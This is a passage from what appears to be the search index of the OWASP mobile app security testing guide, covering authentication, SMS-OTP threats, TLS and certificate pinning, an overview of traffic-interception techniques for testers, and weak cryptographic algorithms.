Model and Security Considerations (January 2013)</li> </ul> <p>Some of the best practices include but are not limited to:</p> <ul> <li>User agent:<ul> <li>The user should have a way to visually verify trust (e.g., Transport Layer Security (TLS) confirmation, website mechanisms).</li> <li>To prevent Machine-in-the-Middle (MITM) attacks, the client should validate the server's fully qualified domain name with the public key the server presented when the connection was established.</li> </ul> </li> <li>Type of grant:<ul> <li>On native apps, code grant should be used instead of implicit grant.</li> <li>When using code grant, PKCE (Proof Key for Code Exchange) should be implemented to protect the code grant. Make sure that the server also implements it.</li> <li>The auth \"code\" should be short-lived and used immediately after it is received. Verify that auth codes only reside on transient memory and aren't stored or logged.</li> </ul> </li> <li>Client secrets:<ul> <li>Shared secrets should not be used to prove the client's identity because the client could be impersonated (\"client_id\" already serves as proof). If they do use client secrets, be sure that they are stored in secure local storage.</li> </ul> </li> <li>End-User credentials:<ul> <li>Secure the transmission of end-user credentials with a transport-layer method, such as TLS.</li> </ul> </li> <li>Tokens:<ul> <li>Keep access tokens in transient memory.</li> <li>Access tokens must be transmitted over an encrypted connection.</li> <li>Reduce the scope and duration of access tokens when end-to-end confidentiality can't be guaranteed or the token provides access to sensitive information or transactions.</li> <li>Remember that an attacker who has stolen tokens can access their scope and all resources associated with them if the app uses access tokens as bearer tokens with no other way to identify the client.</li> <li>Store refresh tokens in secure local storage; they are long-term credentials.</li> </ul> </li> </ul>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#user-logout","title":"User Logout","text":"<p>Failing to destroy the server-side session is one of the most common logout functionality implementation errors. This error keeps the session or token alive, even after the user logs out of the application. An attacker who gets valid authentication information can continue to use it and hijack a user's account.</p> <p>Many mobile apps don't automatically log users out. There can be various reasons, such as: because it is inconvenient for customers, or because of decisions made when implementing stateless authentication. The application should still have a logout function, and it should be implemented according to best practices, destroying all locally stored tokens or session identifiers.</p> <p>If session information is stored on the server, it should be destroyed by sending a logout request to that server. In case of a high-risk application, tokens should be invalidated. Not removing tokens or session identifiers can result in unauthorized access to the application in case the tokens are leaked. Note that other sensitive types of information should be removed as well, as any information that is not properly cleared may be leaked later, for example during a device backup.</p> <p>Here are different examples of session termination for proper server-side logout:</p> <ul> <li>Spring (Java)</li> <li>Ruby on Rails</li> <li>PHP</li> </ul> <p>If access and refresh tokens are used with stateless authentication, they should be deleted from the mobile device. The refresh token should be invalidated on the server.</p> <p>The OWASP Web Testing Guide (WSTG-SESS-06) includes a detailed explanation and more test cases.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#supplementary-authentication","title":"Supplementary Authentication","text":"<p>Authentication schemes are sometimes supplemented by passive contextual authentication, which can incorporate:</p> <ul> <li>Geolocation</li> <li>IP address</li> <li>Time of day</li> <li>The device being used</li> </ul> <p>Ideally, in such a system the user's context is compared to previously recorded data to identify anomalies that might indicate account abuse or potential fraud. This process is transparent to the user, but can become a powerful deterrent to attackers.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#two-factor-authentication","title":"Two-factor Authentication","text":"<p>Two-factor authentication (2FA) is standard for apps that allow users to access sensitive functions and data. Common implementations use a password for the first factor and any of the following as the second factor:</p> <ul> <li>One-time password via SMS (SMS-OTP)</li> <li>One-time code via phone call</li> <li>Hardware or software token</li> <li>Push notifications in combination with PKI and local authentication</li> </ul> <p>Whatever option is used, it always must be enforced and verified on the server-side and never on client-side. Otherwise the 2FA can be easily bypassed within the app.</p> <p>The 2FA can be performed at login or later in the user's session.</p> <p>For example, after logging in to a banking app with a username and PIN, the user is authorized to perform non-sensitive tasks. Once the user attempts to execute a bank transfer, the second factor (\"step-up authentication\") must be presented.</p> <p>Best Practices:</p> <ul> <li>Don't roll your own 2FA: There are various two-factor authentication mechanisms available which can range from third-party libraries, usage of external apps to self implemented checks by the developers.</li> <li>Use short-lived OTPs: A OTP should be valid for only a certain amount of time (usually 30 seconds) and after keying in the OTP wrongly several times (usually 3 times) the provided OTP should be invalidated and the user should be redirected to the landing page or logged out.</li> <li>Store tokens securely: To prevent these kind of attacks, the application should always verify some kind of user token or other dynamic information related to the user that was previously securely stored (e.g. in the Keychain/KeyStore).</li> </ul>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#sms-otp","title":"SMS-OTP","text":"<p>Although one-time passwords (OTP) sent via SMS are a common second factor for two-factor authentication, this method has its shortcomings. In 2016, NIST suggested: \"Due to the risk that SMS messages may be intercepted or redirected, implementers of new systems SHOULD carefully consider alternative authenticators.\". Below you will find a list of some related threats and suggestions to avoid successful attacks on SMS-OTP.</p> <p>Threats:</p> <ul> <li>Wireless Interception: The adversary can intercept SMS messages by abusing femtocells and other known vulnerabilities in the telecommunications network.</li> <li>Trojans: Installed malicious applications with access to text messages may forward the OTP to another number or backend.</li> <li>SIM SWAP Attack: In this attack, the adversary calls the phone company, or works for them, and has the victim's number moved to a SIM card owned by the adversary. If successful, the adversary can see the SMS messages which are sent to the victim's phone number. This includes the messages used in the two-factor authentication.</li> <li>Verification Code Forwarding Attack: This social engineering attack relies on the trust the users have in the company providing the OTP. In this attack, the user receives a code and is later asked to relay that code using the same means in which it received the information.</li> <li>Voicemail: Some two-factor authentication schemes allow the OTP to be sent through a phone call when SMS is no longer preferred or available. Many of these calls, if not answered, send the information to voicemail. If an attacker was able to gain access to the voicemail, they could also use the OTP to gain access to a user's account.</li> </ul> <p>You can find below several suggestions to reduce the likelihood of exploitation when using SMS for OTP:</p> <ul> <li>Messaging: When sending an OTP via SMS, be sure to include a message that lets the user know 1) what to do if they did not request the code 2) your company will never call or text them requesting that they relay their password or code.</li> <li>Dedicated Channel: When using the OS push notification feature (APN on iOS and FCM on Android), OTPs can be sent securely to a registered application. This information is, compared to SMS, not accessible by other applications. Alternatively of a OTP the push notification could trigger a pop-up to approve the requested access.</li> <li>Entropy: Use authenticators with high entropy to make OTPs harder to crack or guess and use at least 6 digits. Make sure that digits are separates in smaller groups in case people have to remember them to copy them to your app.</li> <li>Avoid Voicemail: If a user prefers to receive a phone call, do not leave the OTP information as a voicemail.</li> </ul> <p>SMS-OTP Research:</p> <ul> <li>[#dmitrienko] Dmitrienko, Alexandra, et al. \"On the (in) security of mobile two-factor authentication.\" International Conference on Financial Cryptography and Data Security. Springer, Berlin, Heidelberg, 2014.</li> <li>[#grassi] Grassi, Paul A., et al. Digital identity guidelines: Authentication and lifecycle management (DRAFT). No. Special Publication (NIST SP)-800-63B. 2016.</li> <li>[#grassi2] Grassi, Paul A., et al. Digital identity guidelines: Authentication and lifecycle management. No. Special Publication (NIST SP)-800-63B. 2017.</li> <li>[#konoth] Konoth, Radhesh Krishnan, Victor van der Veen, and Herbert Bos. \"How anywhere computing just killed your phone-based two-factor authentication.\" International Conference on Financial Cryptography and Data Security. Springer, Berlin, Heidelberg, 2016.</li> <li>[#mulliner] Mulliner, Collin, et al. \"SMS-based one-time passwords: attacks and defense.\" International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment. Springer, Berlin, Heidelberg, 2013.</li> <li>[#siadati] Siadati, Hossein, et al. \"Mind your SMSes: Mitigating social engineering in second factor authentication.\" Computers &amp; Security 65 (2017): 14-28.</li> <li>[#siadati2] Siadati, Hossein, Toan Nguyen, and Nasir Memon. \"Verification code forwarding attack (short paper).\" International Conference on Passwords. Springer, Cham, 2015.</li> </ul>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#transaction-signing-with-push-notifications-and-pki","title":"Transaction Signing with Push Notifications and PKI","text":"<p>Another alternative and strong mechanisms to implement a second factor is transaction signing.</p> <p>Transaction signing requires authentication of the user's approval of critical transactions. Asymmetric cryptography is the best way to implement transaction signing. The app will generate a public/private key pair when the user signs up, then registers the public key on the backend. The private key is securely stored in the KeyStore (Android) or KeyChain (iOS). To authorize a transaction, the backend sends the mobile app a push notification containing the transaction data. The user is then asked to confirm or deny the transaction. After confirmation, the user is prompted to unlock the Keychain (by entering the PIN or fingerprint), and the data is signed with user's private key. The signed transaction is then sent to the server, which verifies the signature with the user's public key.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#login-activity-and-device-blocking","title":"Login Activity and Device Blocking","text":"<p>It is a best practice that apps should inform the user about all login activities within the app with the possibility of blocking certain devices. This can be broken down into various scenarios:</p> <ol> <li>The application provides a push notification the moment their account is used on another device to notify the user of different activities. The user can then block this device after opening the app via the push-notification.</li> <li>The application provides an overview of the last session after login. If the previous session was with a different configuration (e.g. location, device, app-version) compared to the current configuration, then the user should have the option to report suspicious activities and block devices used in the previous session.</li> <li>The application provides an overview of the last session after login at all times.</li> <li>The application has a self-service portal in which the user can see an audit-log. This allows the user to manage the different devices that are logged in.</li> </ol> <p>The developer can make use of specific meta-information and associate it to each different activity or event within the application. This will make it easier for the user to spot suspicious behavior and block the corresponding device. The meta-information may include:</p> <ul> <li>Device: The user can clearly identify all devices where the app is being used.</li> <li>Date and Time: The user can clearly see the latest date and time when the app was used.</li> <li>Location: The user can clearly identify the latest locations where the app was used.</li> </ul> <p>The application can provide a list of activities history which will be updated after each sensitive activity within the application. The choice of which activities to audit needs to be done for each application based on the data it handles and the level of security risk the team is willing to have. Below is a list of common sensitive activities that are usually audited:</p> <ul> <li>Login attempts</li> <li>Password changes</li> <li>Personal Identifiable Information changes (name, email address, telephone number, etc.)</li> <li>Sensitive activities (purchase, accessing important resources, etc.)</li> <li>Consent to Terms and Conditions clauses</li> </ul> <p>Paid content requires special care, and additional meta-information (e.g., operation cost, credit, etc.) might be used to ensure user's knowledge about the whole operation's parameters.</p> <p>In addition, non-repudiation mechanisms should be applied to sensitive transactions (e.g. paid content access, given consent to Terms and Conditions clauses, etc.) in order to prove that a specific transaction was in fact performed (integrity) and by whom (authentication).</p> <p>Lastly, it should be possible for the user to log out specific open sessions and in some cases it might be interesting to fully block certain devices using a device identifier.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04f-Testing-Network-Communication/","title":"Mobile App Network Communication","text":"<p>Almost every network-connected mobile app relies on the Hypertext Transfer Protocol (HTTP) or its secure version, HTTPS (which uses Transport Layer Security, TLS) to exchange data with remote endpoints. If not implemented securely, this communication can be vulnerable to network-based attacks such as packet sniffing and Machine-in-the-Middle (MITM) attacks. In this chapter, we explore potential vulnerabilities, testing techniques, and best practices for securing mobile app network communication.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#secure-connections","title":"Secure Connections","text":"<p>The time has long passed since it was reasonable to use cleartext HTTP alone and it's usually trivial to secure HTTP connections using HTTPS. HTTPS is essentially HTTP layered on top of another protocol known as Transport Layer Security (TLS). And TLS performs a handshake using public key cryptography and, when complete, creates a secure connection.</p> <p>An HTTPS connection is considered secure because of three properties:</p> <ul> <li>Confidentiality: TLS encrypts data before sending it over the network, which means it can't be read by an intermediary.</li> <li>Integrity: the data can't be altered without detection.</li> <li>Authentication: the client can validate the identity of the server to make sure the connection is established with the correct server.</li> </ul>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#server-trust-evaluation","title":"Server Trust Evaluation","text":"<p>Certificate Authorities (CAs) are an integral part of a secure client server communication and they are predefined in the trust store of each operating system. For instance, on iOS there are more than 200 root certificates installed (see Apple documentation - Available trusted root certificates for Apple operating systems)</p> <p>CAs can be added to the trust store, either manually by the user, by an MDM that manages the enterprise device or through malware. The question is then: \"can you trust all of those CAs and should your app rely on the default trust store?\". After all, there are well-known cases where certificate authorities have been compromised or tricked into issuing certificates to impostors. A detailed timeline of CA breaches and failures can be found at sslmate.com.</p> <p>Both Android and iOS allow the user to install additional CAs or trust anchors.</p> <p>An app may want to trust a custom set of CAs instead of the platform default. The most common reasons for this are:</p> <ul> <li>Connecting to a host with a custom certificate authority (a CA that isn't known or trusted by the system yet), such as a CA that is self-signed or is issued internally within a company.</li> <li>Limiting the set of CAs to a specific list of trusted CAs.</li> <li>Trusting additional CAs not included in the system.</li> </ul>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#about-trust-stores","title":"About Trust Stores","text":"","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#extending-trust","title":"Extending Trust","text":"<p>Whenever the app connects to a server whose certificate is self-signed or unknown to the system, the secure connection will fail. This is typically the case for any non public CAs, for instance those issued by an organization such as a government, corporation, or education institution for their own use.</p> <p>Both Android and iOS offer means to extend trust, i.e. include additional CAs so that the app trusts the system's built-in ones plus the custom ones.</p> <p>However, remember that the device users are always able to include additional CAs. Therefore, depending on the threat model of the app it might be necessary to avoid trusting any certificates added to the user trust store or even go further and only trust a pre-defined specific certificate or set of certificates.</p> <p>For many apps, the \"default behavior\" provided by the mobile platform will be secure enough for their use case (in the rare case that a system-trusted CA is compromised the data handled by the app is not considered sensitive or other security measures are taken which are resilient even to such a CA breach). However, for other apps such as financial or health apps, the risk of a CA breach, even if rare, must be considered.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#restricting-trust-identity-pinning","title":"Restricting Trust: Identity Pinning","text":"<p>Some apps might need to further increase their security by restricting the number of CAs that they trust. Typically only the CAs which are used by the developer are explicitly trusted, while disregarding all others. This trust restriction is known as Identity Pinning usually implemented as Certificate Pinning or Public Key Pinning.</p> <p>In the OWASP MASTG we will be referring to this term as \"Identity Pinning\", \"Certificate Pinning\", \"Public Key Pinning\" or simply \"Pinning\".</p> <p>Pinning is the process of associating a remote endpoint with a particular identity, such as a X.509 certificate or public key, instead of accepting any certificate signed by a trusted CA. After pinning the server identity (or a certain set, aka. pinset), the mobile app will subsequently connect to those remote endpoints only if the identity matches. Withdrawing trust from unnecessary CAs reduces the app's attack surface.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#general-guidelines","title":"General Guidelines","text":"<p>The OWASP Certificate Pinning Cheat Sheet gives essential guidance on:</p> <ul> <li>when pinning is recommended and which exceptions might apply.</li> <li>when to pin: development time (preloading) or upon first encountering (trust on first use).</li> <li>what to pin: certificate, public key or hash.</li> </ul> <p>Both Android and iOS recommendations match the \"best case\" which is:</p> <ul> <li>Pin only to remote endpoints where the developer has control.</li> <li>at development time via (NSC/ATS)</li> <li>pin a hash of the SPKI <code>subjectPublicKeyInfo</code>.</li> </ul> <p>Pinning has gained a bad reputation since its introduction several years ago. We'd like to clarify a couple of points that are valid at least for mobile application security:</p> <ul> <li>The bad reputation is due to operational reasons (e.g. implementation/pin management complexity) not lack of security.</li> <li>If an app does not implement pinning, this shouldn't be reported as a vulnerability. However, if the app must verify against MAS-L2 it must be implemented.</li> <li>Both Android and iOS make implementing pinning very easy and follow the best practices.</li> <li>Pinning protects against a compromised CA or a malicious CA that is installed on the device. In those cases, pinning will prevent the OS from establishing a secure connection from being established with a malicious server. However, if an attacker is in control of the device, they can easily disable any pinning logic and thus still allow the connection to happen. As a result, this will not prevent an attacker from accessing your backend and abusing server-side vulnerabilities.</li> <li>Pinning in mobile apps is not the same as HTTP Public Key Pinning (HPKP). The HPKP header is no longer recommended on websites as it can lead to users being locked out of the website without any way to revert the lockout. For mobile apps, this is not an issue, as the app can always be updated via an out-of-band channel (i.e. the app store) in case there are any issues.</li> </ul>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#about-pinning-recommendations-in-android-developers","title":"About Pinning Recommendations in Android Developers","text":"<p>The Android Developers site includes the following warning:</p> <p>Caution: Certificate Pinning is not recommended for Android applications due to the high risk of future server configuration changes, such as changing to another Certificate Authority, rendering the application unable to connect to the server without receiving a client software update.</p> <p>They also include this note:</p> <p>Note that, when using certificate pinning, you should always include a backup key so that if you are forced to switch to new keys or change CAs (when pinning to a CA certificate or an intermediate of that CA), your app's connectivity is unaffected. Otherwise, you must push out an update to the app to restore connectivity.</p> <p>The first statement can be mistakenly interpreted as saying that they \"do not recommend certificate pinning\". The second statement clarifies this: the actual recommendation is that if developers want to implement pinning they have to take the necessary precautions.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#about-pinning-recommendations-in-apple-developers","title":"About Pinning Recommendations in Apple Developers","text":"<p>Apple recommends thinking long-term and creating a proper server authentication strategy.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#owasp-mastg-recommendation","title":"OWASP MASTG Recommendation","text":"<p>Pinning is a recommended practice, especially for MAS-L2 apps. However, developers must implement it exclusively for the endpoints under their control and be sure to include backup keys (aka. backup pins) and have a proper app update strategy.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#learn-more","title":"Learn more","text":"<ul> <li>\"Android Security: SSL Pinning\"</li> <li>OWASP Certificate Pinning Cheat Sheet</li> </ul>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#verifying-the-tls-settings","title":"Verifying the TLS Settings","text":"<p>One of the core mobile app functions is sending/receiving data over untrusted networks like the Internet. If the data is not properly protected in transit, an attacker with access to any part of the network infrastructure (e.g., a Wi-Fi access point) may intercept, read, or modify it. This is why plaintext network protocols are rarely advisable.</p> <p>The vast majority of apps rely on HTTP for communication with the backend. HTTPS wraps HTTP in an encrypted connection (the acronym HTTPS originally referred to HTTP over Secure Socket Layer (SSL); SSL is the deprecated predecessor of TLS). TLS allows authentication of the backend service and ensures confidentiality and integrity of the network data.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#recommended-tls-settings","title":"Recommended TLS Settings","text":"<p>Ensuring proper TLS configuration on the server side is also important. The SSL protocol is deprecated and should no longer be used. Also TLS v1.0 and TLS v1.1 have known vulnerabilities and their usage is deprecated in all major browsers by 2020. TLS v1.2 and TLS v1.3 are considered best practice for secure transmission of data. Starting with Android 10 (API level 29) TLS v1.3 will be enabled by default for faster and secure communication. The major change with TLS v1.3 is that customizing cipher suites is no longer possible and that all of them are enabled when TLS v1.3 is enabled, whereas Zero Round Trip (0-RTT) mode isn't supported.</p> <p>When both the client and server are controlled by the same organization and used only for communicating with one another, you can increase security by hardening the configuration.</p> <p>If a mobile application connects to a specific server, its networking stack can be tuned to ensure the highest possible security level for the server's configuration. Lack of support in the underlying operating system may force the mobile application to use a weaker configuration.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#cipher-suites-terminology","title":"Cipher Suites Terminology","text":"<p>Cipher suites have the following structure:</p> <pre><code>Protocol_KeyExchangeAlgorithm_WITH_BlockCipher_IntegrityCheckAlgorithm\n</code></pre> <p>This structure includes:</p> <ul> <li>A Protocol used by the cipher</li> <li>A Key Exchange Algorithm used by the server and the client to authenticate during the TLS handshake</li> <li>A Block Cipher used to encrypt the message stream</li> <li>A Integrity Check Algorithm used to authenticate messages</li> </ul> <p>Example: <code>TLS_RSA_WITH_3DES_EDE_CBC_SHA</code></p> <p>In the example above the cipher suites uses:</p> <ul> <li>TLS as protocol</li> <li>RSA Asymmetric encryption for Authentication</li> <li>3DES for Symmetric encryption with EDE_CBC mode</li> <li>SHA Hash algorithm for integrity</li> </ul> <p>Note that in TLSv1.3 the Key Exchange Algorithm is not part of the cipher suite, instead it is determined during the TLS handshake.</p> <p>In the following listing, we'll present the different algorithms of each part of the cipher suite.</p> <p>Protocols:</p> <ul> <li><code>SSLv1</code></li> <li><code>SSLv2</code> - RFC 6176</li> <li><code>SSLv3</code> - RFC 6101</li> <li><code>TLSv1.0</code> - RFC 2246</li> <li><code>TLSv1.1</code> - RFC 4346</li> <li><code>TLSv1.2</code> - RFC 5246</li> <li><code>TLSv1.3</code> - RFC 8446</li> </ul> <p>Key Exchange Algorithms:</p> <ul> <li><code>DSA</code> - RFC 6979</li> <li><code>ECDSA</code> - RFC 6979</li> <li><code>RSA</code> - RFC 8017</li> <li><code>DHE</code> - RFC 2631 - RFC 7919</li> <li><code>ECDHE</code> - RFC 4492</li> <li><code>PSK</code> - RFC 4279</li> <li><code>DSS</code> - FIPS186-4</li> <li><code>DH_anon</code> - RFC 2631 - RFC 7919</li> <li><code>DHE_RSA</code> - RFC 2631 - RFC 7919</li> <li><code>DHE_DSS</code> - RFC 2631 - RFC 7919</li> <li><code>ECDHE_ECDSA</code> - RFC 8422</li> <li><code>ECDHE_PSK</code>  - RFC 8422 - RFC 5489</li> <li><code>ECDHE_RSA</code>  - RFC 8422</li> </ul> <p>Block Ciphers:</p> <ul> <li><code>DES</code>  - RFC 4772</li> <li><code>DES_CBC</code>  - RFC 1829</li> <li><code>3DES</code>  - RFC 2420</li> <li><code>3DES_EDE_CBC</code> - RFC 2420</li> <li><code>AES_128_CBC</code> - RFC 3268</li> <li><code>AES_128_GCM</code>  - RFC 5288</li> <li><code>AES_256_CBC</code> - RFC 3268</li> <li><code>AES_256_GCM</code> - RFC 5288</li> <li><code>RC4_40</code>  - RFC 7465</li> <li><code>RC4_128</code>  - RFC 7465</li> <li><code>CHACHA20_POLY1305</code>  - RFC 7905 - RFC 7539</li> </ul> <p>Integrity Check Algorithms:</p> <ul> <li><code>MD5</code>  - RFC 6151</li> <li><code>SHA</code>  - RFC 6234</li> <li><code>SHA256</code>  - RFC 6234</li> <li><code>SHA384</code>  - RFC 6234</li> </ul> <p>Note that the efficiency of a cipher suite depends on the efficiency of its algorithms.</p> <p>The following resources contain the latest recommended cipher suites to use with TLS:</p> <ul> <li>IANA recommended cipher suites can be found in TLS Cipher Suites.</li> <li>OWASP recommended cipher suites can be found in the TLS Cipher String Cheat Sheet.</li> </ul> <p>Some Android and iOS versions do not support some of the recommended cipher suites, so for compatibility purposes you can check the supported cipher suites for Android and iOS versions and choose the top supported cipher suites.</p> <p>If you want to verify whether your server supports the right cipher suites, there are various tools you can use:</p> <ul> <li>nscurl - see iOS Network Communication for more details.</li> <li>testssl.sh which \"is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as some cryptographic flaws\".</li> </ul> <p>Finally, verify that the server or termination proxy at which the HTTPS connection terminates is configured according to best practices. See also the OWASP Transport Layer Protection cheat sheet and the Qualys SSL/TLS Deployment Best Practices.</p>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm","title":"Intercepting Network Traffic Through MITM","text":"<p>Intercepting mobile app traffic is a critical aspect of security testing, enabling testers, analysts, or penetration testers to analyze and manipulate network communications to identify vulnerabilities. A key technique in this process is the Machine-in-the-Middle (MITM) attack (also known as \"Man-in-the-Middle\" (traditionally), \"Adversary-in-the-Middle\" (e.g. by MITRE and CAPEC), etc.), where the attacker positions their machine between two communicating entities, typically the mobile app (client) and the servers it is communicating with. By doing so, the attacker's machine intercepts and monitors the data being transmitted between the different parties.</p> <p>This technique is twofold:</p> <ul> <li>Typically used by malicious attackers to intercept, monitor, and potentially alter the communication without either party (app or server) being aware. This allows for malicious activities such as eavesdropping, injecting malicious content, or manipulating the data being exchanged.</li> <li>However, in the context of the OWASP MASTG and mobile app security testing, we use it as part of our techniques to allow the app tester to review, analyze, or modify the traffic to identify vulnerabilities such as unencrypted communication or weak security controls.</li> </ul> <p>The specific interception method used depends on the app's security mechanisms and the nature of the data being transmitted. Each approach varies in complexity and effectiveness, depending on factors such as encryption and the app's ability to resist interference.</p> <p>Here's an overview of interception techniques at different network layers:</p> Interception Technique Example Tools Note API hooking (<code>HttpUrlConnection</code>, <code>NSURLSession</code>, <code>WebRequest</code>) Frida Modifies how apps handle network requests. Hooking TLS functions (<code>SSL_read</code>, <code>SSL_write</code>) Frida, SSL Kill Switch Intercepts encrypted data before it reaches the app. Proxy interception Burp Suite, ZAP, mitmproxy Requires app to respect proxy settings. Packet sniffing <code>tcpdump</code>, Wireshark Captures all TCP/UDP traffic but does not decrypt HTTPS. MITM via ARP spoofing bettercap Tricks devices into sending their traffic through the attacker's machine even when the network isn't controlled by the attacker. Rogue Wi-Fi AP <code>hostapd</code>, <code>dnsmasq</code>, <code>iptables</code>, <code>wpa_supplicant</code>, <code>airmon-ng</code> Uses an access point fully controlled by the attacker. <p>You can find more information on these techniques in their corresponding technique pages:</p> <ul> <li> Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer</li> <li> Intercepting HTTP Traffic Using an Interception Proxy</li> <li> Intercepting Non-HTTP Traffic Using an Interception Proxy</li> <li> Passive Eavesdropping</li> <li> Achieving a MITM Position via ARP Spoofing</li> <li> Achieving a MITM Position Using a Rogue Access Point</li> </ul> <p>Note about certificate pinning: If the app uses certificate pinning, the techniques above may seem to fail once you start intercepting the traffic, but you can bypass it using different methods. See the following techniques for more information:</p> <ul> <li>Android:  Bypassing Certificate Pinning</li> <li>iOS:  Bypassing Certificate Pinning</li> </ul>","tags":["all","MASVS-NETWORK"]},{"location":"MASTG/0x04g-Testing-Cryptography/","title":"Mobile App Cryptography","text":"<p>Cryptography plays an especially important role in securing the user's data - even more so in a mobile environment, where attackers having physical access to the user's device is a likely scenario. This chapter provides an outline of cryptographic concepts and best practices relevant to mobile apps. These best practices are valid independent of the mobile operating system.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#key-concepts","title":"Key Concepts","text":"<p>The goal of cryptography is to provide constant confidentiality, data integrity, and authenticity, even in the face of an attack. Confidentiality involves ensuring data privacy through the use of encryption. Data integrity deals with data consistency and detection of tampering and modification of data through the use of hashing. Authenticity ensures that the data comes from a trusted source.</p> <p>An encryption algorithm converts plaintext data into ciphertext, which conceals the original content. The plaintext data can be restored from the ciphertext through decryption. There are two types of encryption: symmetric (encryption and decryption use the same secret key) and asymmetric (encryption and decryption use a public and private key pair). Symmetric encryption operations do not protect data integrity unless they are used with an approved cipher mode that supports authenticated encryption with a random initialization vector (IV) that fulfills the \"uniqueness\" requirement NIST SP 800-38D - \"Recommendation for Block Cipher Modes of Operation: Galois/Counter Mode (GCM) and GMAC\", 2007.</p> <p>Symmetric-key encryption algorithms use the same key for both encryption and decryption. This type of encryption is fast and suitable for bulk data processing. Since everybody who has access to the key is able to decrypt the encrypted content, this method requires careful key management and centralized control over key distribution.</p> <p>Public-key encryption algorithms operate with two separate keys: the public key and the private key. The public key can be distributed freely while the private key shouldn't be shared with anyone. A message encrypted with the public key can only be decrypted with the private key and vice-versa. Since asymmetric encryption is several times slower than symmetric operations, it's typically only used to encrypt small amounts of data, such as symmetric keys for bulk encryption.</p> <p>Hashing isn't a form of encryption, but it does use cryptography. Hash functions map arbitrary pieces of data into fixed-length values in a deterministic way. While it's easy to compute the hash from the input, it's very difficult (i.e., infeasible) to determine the original input from the hash. Additionally, the hash changes completely when even a single bit of the input changes. Hash functions are used for storing passwords, verifying integrity (e.g., digital signatures or document management), and managing files. Although hash functions don't provide an authenticity guarantee, they can be combined as cryptographic primitives to do so.</p> <p>Message Authentication Codes (MACs) combine other cryptographic mechanisms (such as symmetric encryption or hashes) with secret keys to provide both integrity and authenticity protection. However, in order to verify a MAC, multiple entities have to share the same secret key and any of those entities can generate a valid MAC. HMACs, the most commonly used type of MAC, rely on hashing as the underlying cryptographic primitive. The full name of an HMAC algorithm usually includes the underlying hash function's type (for example, HMAC-SHA256 uses the SHA-256 hash function).</p> <p>Signatures combine asymmetric cryptography (that is, using a public/private key pair) with hashing to provide integrity and authenticity by encrypting the hash of the message with the private key. However, unlike MACs, signatures also provide non-repudiation property as the private key should remain unique to the data signer.</p> <p>Key Derivation Functions (KDFs) derive secret keys from a secret value (such as a password) and are used to turn keys into other formats or to increase their length. KDFs are similar to hashing functions but have other uses as well (for example, they are used as components of multi-party key-agreement protocols). While both hashing functions and KDFs must be difficult to reverse, KDFs have the added requirement that the keys they produce must have a level of randomness.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#identifying-insecure-andor-deprecated-cryptographic-algorithms","title":"Identifying Insecure and/or Deprecated Cryptographic Algorithms","text":"<p>When assessing a mobile app, you should make sure that it does not use cryptographic algorithms and protocols that have significant known weaknesses or are otherwise insufficient for modern security requirements. Algorithms that were considered secure in the past may become insecure over time; therefore, it's important to periodically check current best practices and adjust configurations accordingly.</p> <p>Verify that cryptographic algorithms are up to date and in-line with industry standards. Vulnerable algorithms include outdated block ciphers (such as DES and 3DES), stream ciphers (such as RC4), hash functions (such as MD5 and SHA1), and broken random number generators (such as Dual_EC_DRBG and SHA1PRNG). Note that even algorithms that are certified (for example, by NIST) can become insecure over time. A certification does not replace periodic verification of an algorithm's soundness. Algorithms with known weaknesses should be replaced with more secure alternatives. Additionally, algorithms used for encryption must be standardized and open to verification. Encrypting data using any unknown, or proprietary algorithms may expose the application to different cryptographic attacks which may result in recovery of the plaintext.</p> <p>Inspect the app's source code to identify instances of cryptographic algorithms that are known to be weak, such as:</p> <ul> <li>DES, 3DES</li> <li>RC2</li> <li>RC4</li> <li>BLOWFISH</li> <li>MD4</li> <li>MD5</li> <li>SHA1</li> </ul> <p>The names of cryptographic APIs depend on the particular mobile platform.</p> <p>Please make sure that:</p> <ul> <li>Cryptographic algorithms are up to date and in-line with industry standards. This includes, but is not limited to outdated block ciphers (e.g. DES), stream ciphers (e.g. RC4), as well as hash functions (e.g. MD5) and broken random number generators like Dual_EC_DRBG (even if they are NIST certified). All of these should be marked as insecure and should not be used and removed from the application and server.</li> <li>Key lengths are in line with industry standards and provide sufficient protection over a long period of time. A comparison of different key lengths and the protection they provide, taking Moore's Law into account, is available online.</li> <li>Through NIST SP 800-131A - \"Transitioning the Use of Cryptographic 